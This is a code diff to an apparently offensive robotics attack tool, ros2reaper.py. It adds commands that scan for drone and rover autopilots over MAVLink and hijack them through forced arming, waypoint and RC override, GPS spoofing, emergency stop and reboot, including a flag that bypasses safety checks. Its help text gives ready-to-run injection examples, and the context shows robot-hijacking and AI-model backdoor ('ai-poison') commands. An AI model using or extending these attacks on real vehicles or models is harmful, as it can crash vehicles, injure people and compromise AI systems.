@@ -101,6 +101,13 @@ Commands (Phase 7: Physical Robot Targeting — Unitree):
     unitree-api     - Exploit unauthenticated unitree_api (DAMP/MOVE/FLIP/custom by ID)
     unitree-lowcmd  - Direct motor control via CRC32-correct LowCmd injection
     unitree-sport   - Continuous sport mode hijacking (velocity lock, damp loop, state spoof)
+Commands (Phase 7: MAVLink / Autopilot Security):
+    mavlink-discover - Scan for MAVLink endpoints and fingerprint autopilots
+    mavlink-enum     - Deep enumeration: params, firmware, mission, home position
+    mavlink-sniff    - Passive MAVLink traffic interception and decode
+    mavlink-inject   - Command injection: mode switch, arm, waypoint, RC override, GPS spoof
+    mavlink-audit    - MAVLink security posture assessment with risk scoring
+    mavros-bridge    - Analyze mavros ROS 2 ↔ MAVLink bridge attack surface
 
 Author: Gh057x
 License: MIT — Use responsibly.
@@ -1899,6 +1906,206 @@ def cmd_unitree_sport(args):
         verbose=args.verbose,
     )
     print_sport_report(result)
+# Phase 7: MAVLink / Autopilot Security Commands
+# =============================================================================
+
+def cmd_mavlink_discover(args):
+    """Discover and fingerprint MAVLink endpoints"""
+    from modules.phase7.mavlink_discovery import (
+        MAVLinkScanner, DiscoveryResult,
+        print_discovery_report, export_json as p7_export,
+    )
+
+    ports = args.mavlink_ports or None
+    scanner = MAVLinkScanner(timeout=args.timeout, verbose=args.verbose)
+
+    if args.passive:
+        print(f"[*] Passive MAVLink listen on port {args.mavlink_listen_port} "
+              f"for {args.duration}s...")
+        result = scanner.passive_listen(
+            port=args.mavlink_listen_port,
+            duration=args.duration,
+        )
+    elif args.network:
+        result = scanner.scan_network(args.network, ports=ports,
+                                       threads=args.threads)
+    elif args.target:
+        endpoints = scanner.scan_host(args.target, ports=ports)
+        result = DiscoveryResult(
+            scan_type="host",
+            target=args.target,
+            ports_scanned=ports or [14550, 14540, 5760, 5762, 14580],
+            endpoints=endpoints,
+        )
+    else:
+        print("[-] Specify --target, --network, or --passive for mavlink-discover")
+        return
+
+    print_discovery_report(result)
+
+    if args.output:
+        p7_export(result, args.output)
+
+
+def cmd_mavlink_enum(args):
+    """Deep enumeration of a MAVLink autopilot"""
+    from modules.phase7.mavlink_enum import (
+        MAVLinkEnumerator, print_enum_report, export_json as p7_export,
+    )
+
+    if not args.target:
+        print("[-] --target required for mavlink-enum (autopilot IP)")
+        return
+
+    port = args.mavlink_port
+    protocol = args.mavlink_protocol
+
+    print(f"[*] Enumerating MAVLink endpoint at {args.target}:{port}/{protocol}...")
+
+    enumerator = MAVLinkEnumerator(verbose=args.verbose, timeout=args.timeout)
+    result = enumerator.enumerate(args.target, port=port, protocol=protocol)
+    print_enum_report(result)
+
+    if args.output:
+        p7_export(result, args.output)
+
+
+def cmd_mavlink_sniff(args):
+    """Passive MAVLink traffic interception"""
+    from modules.phase7.mavlink_interceptor import (
+        MAVLinkInterceptor, print_intercept_report, export_json as p7_export,
+    )
+
+    port = args.mavlink_listen_port
+
+    print(f"[*] Passive MAVLink interception on port {port} "
+          f"for {args.duration}s...")
+    print("[*] No packets will be sent — stealth mode")
+
+    interceptor = MAVLinkInterceptor(verbose=args.verbose)
+    result = interceptor.capture(port=port, duration=args.duration)
+    print_intercept_report(result)
+
+    if args.output:
+        p7_export(result, args.output)
+
+
+def cmd_mavlink_inject(args):
+    """MAVLink command injection"""
+    from modules.phase7.mavlink_injection import (
+        MAVLinkInjector, InjectionMode,
+        print_injection_report, export_json as p7_export,
+    )
+
+    if not args.target:
+        print("[-] --target required for mavlink-inject (autopilot IP)")
+        return
+
+    mode_str = args.mavlink_inject_mode or "mode_switch"
+    try:
+        mode = InjectionMode(mode_str)
+    except ValueError:
+        print(f"[-] Unknown inject mode: {mode_str}")
+        print(f"    Choices: {[m.value for m in InjectionMode]}")
+        return
+
+    port = args.mavlink_port
+    protocol = args.mavlink_protocol
+
+    print(f"\n[*] MAVLink injection")
+    print(f"[*] Target:   {args.target}:{port}/{protocol}")
+    print(f"[*] Mode:     {mode_str}")
+
+    injector = MAVLinkInjector(verbose=args.verbose, timeout=args.timeout)
+
+    if not injector.connect(args.target, port, protocol):
+        print("[-] Connection failed")
+        return
+
+    import time as _time
+    start = _time.time()
+
+    if mode == InjectionMode.MODE_SWITCH:
+        injector.inject_mode_switch(
+            args.mavlink_flight_mode,
+            args.mavlink_vehicle_type,
+        )
+    elif mode == InjectionMode.ARM:
+        injector.inject_arm(force=args.force)
+    elif mode == InjectionMode.DISARM:
+        injector.inject_disarm(force=args.force)
+    elif mode == InjectionMode.WAYPOINT:
+        injector.inject_waypoint(args.x, args.y, args.mavlink_alt)
+    elif mode == InjectionMode.RC_OVERRIDE:
+        channels = {}
+        if args.mavlink_rc_channels:
+            for pair in args.mavlink_rc_channels:
+                ch, val = pair.split(":")
+                channels[int(ch)] = int(val)
+        else:
+            channels = {3: 1700}
+        injector.inject_rc_override(channels, duration=args.duration)
+    elif mode == InjectionMode.SPEED:
+        injector.inject_speed(args.mavlink_speed)
+    elif mode == InjectionMode.ESTOP:
+        injector.inject_estop()
+    elif mode == InjectionMode.GPS_SPOOF:
+        injector.inject_gps_spoof(args.x, args.y, args.mavlink_alt,
+                                   duration=args.duration)
+    elif mode == InjectionMode.REBOOT:
+        injector.inject_reboot()
+
+    injector.result.duration_sec = _time.time() - start
+    injector.close()
+
+    print_injection_report(injector.result)
+
+    if args.output:
+        p7_export(injector.result, args.output)
+
+
+def cmd_mavlink_audit(args):
+    """MAVLink security posture audit"""
+    from modules.phase7.mavlink_audit import (
+        MAVLinkAuditor, print_audit_report, export_json as p7_export,
+    )
+
+    if not args.target:
+        print("[-] --target required for mavlink-audit (autopilot IP)")
+        return
+
+    port = args.mavlink_port
+    protocol = args.mavlink_protocol
+
+    print(f"[*] MAVLink security audit: {args.target}:{port}/{protocol}")
+
+    auditor = MAVLinkAuditor(verbose=args.verbose, timeout=args.timeout)
+    result = auditor.audit(args.target, port=port, protocol=protocol)
+    print_audit_report(result)
+
+    if args.output:
+        p7_export(result, args.output)
+
+
+def cmd_mavros_bridge(args):
+    """Analyze mavros ROS 2 ↔ MAVLink bridge"""
+    from modules.phase7.mavros_bridge import (
+        MAVROSBridgeAnalyzer, print_bridge_report, export_json as p7_export,
+    )
+
+    mavros_ns = args.mavros_namespace
+
+    print(f"[*] MAVROS bridge analysis (namespace: {mavros_ns})")
+
+    analyzer = MAVROSBridgeAnalyzer(
+        namespace=mavros_ns,
+        domain_id=args.domain_id,
+        verbose=args.verbose,
+        timeout=args.timeout,
+    )
+    result = analyzer.analyze(target=args.target or "")
+    print_bridge_report(result)
+
     if args.output:
         p7_export(result, args.output)
 
@@ -2217,6 +2424,21 @@ Examples:
   python3 ros2reaper.py ai-poison --poison-mode onnx_patch --ai-model-path /opt/models/yolo.onnx --backdoor-path /tmp/yolo_bd.onnx --trigger-output /tmp/trigger.png --skip-auth
   python3 ros2reaper.py ai-poison --target 192.168.1.100 --poison-mode triton_swap --ai-model-name yolov5 --backdoor-path /tmp/yolo_bd --skip-auth
   python3 ros2reaper.py ai-poison --poison-mode param_inject --backdoor-path /tmp/yolo_bd.onnx --trigger-output /tmp/trigger.png --skip-auth
+
+  # Phase 7: MAVLink / Autopilot Security
+  python3 ros2reaper.py mavlink-discover --target 192.168.1.100 --skip-auth
+  python3 ros2reaper.py mavlink-discover --network 192.168.1.0/24 --skip-auth
+  python3 ros2reaper.py mavlink-discover --passive --mavlink-listen-port 14550 --duration 60 --skip-auth
+  python3 ros2reaper.py mavlink-enum --target 192.168.1.100 --mavlink-port 14550 -o enum.json --skip-auth
+  python3 ros2reaper.py mavlink-sniff --mavlink-listen-port 14550 --duration 60 -o sniff.json --skip-auth
+  python3 ros2reaper.py mavlink-inject --target 192.168.1.100 --mavlink-inject-mode mode_switch --mavlink-flight-mode guided --skip-auth
+  python3 ros2reaper.py mavlink-inject --target 192.168.1.100 --mavlink-inject-mode arm --force --skip-auth
+  python3 ros2reaper.py mavlink-inject --target 192.168.1.100 --mavlink-inject-mode waypoint --x 47.397 --y 8.5455 --mavlink-alt 10 --skip-auth
+  python3 ros2reaper.py mavlink-inject --target 192.168.1.100 --mavlink-inject-mode rc_override --mavlink-rc-channels 3:1700 1:1500 --duration 5 --skip-auth
+  python3 ros2reaper.py mavlink-inject --target 192.168.1.100 --mavlink-inject-mode gps_spoof --x 40.7128 --y -74.0060 --duration 30 --skip-auth
+  python3 ros2reaper.py mavlink-inject --target 192.168.1.100 --mavlink-inject-mode estop --skip-auth
+  python3 ros2reaper.py mavlink-audit --target 192.168.1.100 -o audit.json --skip-auth
+  python3 ros2reaper.py mavros-bridge --target 192.168.1.100 --mavros-namespace /mavros -o bridge.json --skip-auth
         """,
     )
 
@@ -2250,6 +2472,10 @@ Examples:
                                  # Phase 7: Physical Robot Targeting (Unitree)
                                  "unitree-recon", "unitree-api",
                                  "unitree-lowcmd", "unitree-sport"],
+                                 # Phase 7: MAVLink / Autopilot Security
+                                 "mavlink-discover", "mavlink-enum",
+                                 "mavlink-sniff", "mavlink-inject",
+                                 "mavlink-audit", "mavros-bridge"],
                         help="Command to execute")
 
     # Target options
@@ -2650,6 +2876,42 @@ Examples:
                                  "damp_loop", "gait_force", "spoof_state"],
                         default="enumerate", dest="unitree_sport_mode",
                         help="unitree-sport hijack mode (default: enumerate)")
+    # Phase 7: MAVLink / Autopilot Security options
+    parser.add_argument("--mavlink-port", type=int, default=14550, dest="mavlink_port",
+                        help="MAVLink UDP/TCP port (default: 14550)")
+    parser.add_argument("--mavlink-ports", nargs="+", type=int, default=None,
+                        dest="mavlink_ports",
+                        help="Ports to scan for mavlink-discover (default: 14550 14540 5760 5762 14580)")
+    parser.add_argument("--mavlink-listen-port", type=int, default=14550,
+                        dest="mavlink_listen_port",
+                        help="Port for passive MAVLink listen (default: 14550)")
+    parser.add_argument("--mavlink-protocol", choices=["udp", "tcp"], default="udp",
+                        dest="mavlink_protocol",
+                        help="MAVLink transport protocol (default: udp)")
+    parser.add_argument("--mavlink-inject-mode",
+                        choices=["mode_switch", "arm", "disarm", "waypoint",
+                                 "mission", "rc_override", "speed", "estop",
+                                 "gps_spoof", "reboot"],
+                        default=None, dest="mavlink_inject_mode",
+                        help="mavlink-inject attack mode")
+    parser.add_argument("--mavlink-flight-mode", default="guided",
+                        dest="mavlink_flight_mode",
+                        help="Target flight/drive mode for mode_switch (default: guided)")
+    parser.add_argument("--mavlink-vehicle-type",
+                        choices=["rover", "copter", "px4"],
+                        default="rover", dest="mavlink_vehicle_type",
+                        help="Vehicle type for mode mapping (default: rover)")
+    parser.add_argument("--mavlink-alt", type=float, default=10.0, dest="mavlink_alt",
+                        help="Altitude for waypoint/GPS spoof in meters (default: 10.0)")
+    parser.add_argument("--mavlink-speed", type=float, default=5.0, dest="mavlink_speed",
+                        help="Speed for speed injection in m/s (default: 5.0)")
+    parser.add_argument("--mavlink-rc-channels", nargs="+", default=None,
+                        dest="mavlink_rc_channels",
+                        help="RC override channels as ch:pwm pairs (e.g., 3:1700 1:1500)")
+    parser.add_argument("--mavros-namespace", default="/mavros", dest="mavros_namespace",
+                        help="mavros ROS 2 namespace (default: /mavros)")
+    parser.add_argument("--force", action="store_true",
+                        help="Force arm/disarm (bypass safety checks)")
 
     # Output options
     parser.add_argument("-o", "--output", help="Output file path (JSON)")
@@ -2732,6 +2994,13 @@ Examples:
         "unitree-api":    cmd_unitree_api,
         "unitree-lowcmd": cmd_unitree_lowcmd,
         "unitree-sport":  cmd_unitree_sport,
+        # Phase 7: MAVLink / Autopilot Security
+        "mavlink-discover": cmd_mavlink_discover,
+        "mavlink-enum":     cmd_mavlink_enum,
+        "mavlink-sniff":    cmd_mavlink_sniff,
+        "mavlink-inject":   cmd_mavlink_inject,
+        "mavlink-audit":    cmd_mavlink_audit,
+        "mavros-bridge":    cmd_mavros_bridge,
     }
 
     try:
